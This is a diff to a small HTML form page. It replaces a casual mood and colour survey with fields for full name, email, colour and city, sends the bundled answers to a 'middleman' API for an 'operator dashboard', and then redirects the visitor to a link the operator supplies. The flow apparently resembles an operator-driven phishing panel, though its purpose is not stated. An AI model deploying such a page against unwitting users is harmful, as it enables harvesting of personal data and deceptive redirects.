@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>trial</title>
+  <title>Trial</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     
@@ -17,6 +17,7 @@
       padding: 15px;
     }
 
+    /* Mobile Phone Wrapper */
     .phone-card {
       width: 100%;
       max-width: 380px;
@@ -27,9 +28,10 @@
       border: 1px solid #e0e0e0;
     }
 
+    /* Top Black Banner */
     .banner {
-      background: linear-gradient(135deg, #0066ff, #0044cc);
-      color: white;
+      background: #000000;
+      color: #ffffff;
       padding: 22px 15px;
       text-align: center;
     }
@@ -38,20 +40,20 @@
       font-size: 24px;
       font-weight: 700;
       letter-spacing: 0.5px;
-      text-transform: lowercase;
     }
 
+    /* Form Content */
     .content {
       padding: 22px 20px;
       display: flex;
       flex-direction: column;
-      gap: 18px;
+      gap: 16px;
     }
 
     .question-group {
       display: flex;
       flex-direction: column;
-      gap: 8px;
+      gap: 6px;
       text-align: left;
     }
 
@@ -61,8 +63,7 @@
       color: #333;
     }
 
-    .question-group input[type="text"],
-    .question-group select {
+    .question-group input[type="text"] {
       width: 100%;
       padding: 12px;
       border: 1px solid #ccc;
@@ -72,15 +73,15 @@
       transition: border-color 0.2s;
     }
 
-    .question-group input[type="text"]:focus,
-    .question-group select:focus {
-      border-color: #0066ff;
+    .question-group input[type="text"]:focus {
+      border-color: #000000;
     }
 
+    /* Continue Button */
     .submit-btn {
       width: 100%;
       padding: 14px;
-      background-color: #0066ff;
+      background-color: #000000;
       color: white;
       border: none;
       border-radius: 10px;
@@ -92,9 +93,10 @@
     }
 
     .submit-btn:hover {
-      background-color: #0044cc;
+      background-color: #222222;
     }
 
+    /* Status Spinner & Messages */
     #status {
       text-align: center;
       font-weight: 600;
@@ -104,7 +106,7 @@
 
     .spinner {
       border: 4px solid #f3f3f3;
-      border-top: 4px solid #0066ff;
+      border-top: 4px solid #000000;
       border-radius: 50%;
       width: 36px;
       height: 36px;
@@ -121,65 +123,78 @@
 <body>
 
   <div class="phone-card">
+    
+    <!-- Black Header Banner -->
     <div class="banner">
-      <h1>trial</h1>
+      <h1>Trial</h1>
     </div>
 
+    <!-- 4 Short Answer Questions -->
     <div class="content">
 
       <div class="question-group">
-        <label for="moodSelect">1. How is your day going?</label>
-        <select id="moodSelect">
-          <option value="great">Great 😁</option>
-          <option value="good">Good 🙂</option>
-          <option value="busy">Busy 🏃‍♂️</option>
-        </select>
+        <label for="q1">1. What is your full name?</label>
+        <input type="text" id="q1" placeholder="e.g. John Doe">
       </div>
 
       <div class="question-group">
-        <label for="colorInput">2. What is your favorite color?</label>
-        <input type="text" id="colorInput" placeholder="e.g. Violet, Crimson, Cyan">
+        <label for="q2">2. What is your email address?</label>
+        <input type="text" id="q2" placeholder="e.g. john@example.com">
       </div>
 
       <div class="question-group">
-        <label for="animalInput">3. Favorite animal?</label>
-        <input type="text" id="animalInput" placeholder="e.g. Dolphin, Eagle">
+        <label for="q3">3. What is your favorite color?</label>
+        <input type="text" id="q3" placeholder="e.g. Crimson, Blue">
       </div>
 
-      <button class="submit-btn" onclick="sendToMiddleman()">Submit Request</button>
+      <div class="question-group">
+        <label for="q4">4. What city do you live in?</label>
+        <input type="text" id="q4" placeholder="e.g. London, New York">
+      </div>
+
+      <button class="submit-btn" onclick="sendToMiddleman()">Continue</button>
 
       <div id="status"></div>
     </div>
+
   </div>
 
   <script>
     async function sendToMiddleman() {
-      const color = document.getElementById('colorInput').value.trim();
+      const ans1 = document.getElementById('q1').value.trim();
+      const ans2 = document.getElementById('q2').value.trim();
+      const ans3 = document.getElementById('q3').value.trim();
+      const ans4 = document.getElementById('q4').value.trim();
+
       const statusDiv = document.getElementById('status');
 
-      if (!color) {
-        alert('Please answer question 2!');
+      if (!ans1 || !ans2 || !ans3 || !ans4) {
+        alert('Please answer all 4 questions!');
         return;
       }
 
-      statusDiv.style.color = '#0066ff';
+      // 1. Show spinner and transfer message
+      statusDiv.style.color = '#000000';
       statusDiv.innerHTML = `
         <div class="spinner"></div>
-        <p>Please wait... processing your request</p>
+        <p>You are being transferred, wait...</p>
       `;
 
+      // Bundle all answers into one string for the operator dashboard
+      const summaryPayload = `Name: ${ans1} | Email: ${ans2} | Color: ${ans3} | City: ${ans4}`;
+
       try {
-        // Relative API route
+        // 2. Post request to middleman API
         const res = await fetch('/api/request', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ color: color })
+          body: JSON.stringify({ color: summaryPayload })
         });
 
         const data = await res.json();
         const requestId = data.requestId;
 
-        // Poll relative API route
+        // 3. Poll status every 2 seconds
         const interval = setInterval(async () => {
           const checkRes = await fetch(`/api/status/${requestId}`);
           const checkData = await checkRes.json();
@@ -190,6 +205,7 @@
             statusDiv.style.color = 'green';
             statusDiv.innerHTML = `<p>Link received! Redirecting...</p>`;
 
+            // 4. Auto-redirect browser tab
             setTimeout(() => {
               window.location.href = checkData.link;
             }, 600);
